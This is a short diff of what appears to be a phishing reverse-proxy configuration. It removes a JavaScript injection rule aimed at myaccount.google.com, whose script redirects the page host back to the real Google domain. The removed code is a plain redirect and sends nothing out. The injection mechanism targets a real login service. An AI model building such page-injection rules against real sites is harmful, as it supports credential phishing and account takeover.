@@ -75,16 +75,6 @@ js_inject:
               
         }, 3500);
         
-  - trigger_domains: ['myaccount.google.com']
-    trigger_paths: ['.*?']
-    script: |
-      (function () {
-        'use strict';
-        let subdomain = window.location.host.split('.')[0];
-        if (subdomain == "myaccount") {
-          window.location.host = "myaccount.google.com";
-          // console.log("redirecting to myaccount.google.com");
-        }
-      }());
+
 
         
